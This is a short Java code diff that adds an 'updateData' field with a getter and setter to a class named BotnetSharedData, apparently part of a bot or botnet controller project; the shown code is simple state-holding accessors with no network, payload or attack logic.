@@ -16,6 +16,7 @@ public final class BotnetSharedData {
 
     private volatile UpdateResponse updateResponse;
     private volatile TaskResponse taskResponse;
+    private volatile BotnetUpdateData updateData;
 
     private int maxTaskUpdates;
 
@@ -39,5 +40,13 @@ public final class BotnetSharedData {
 
     public int getMaxTaskUpdates() {
         return maxTaskUpdates;
+    }
+
+    public BotnetUpdateData getUpdateData() {
+        return updateData;
+    }
+
+    public void setUpdateData(BotnetUpdateData updateData) {
+        this.updateData = updateData;
     }
 }
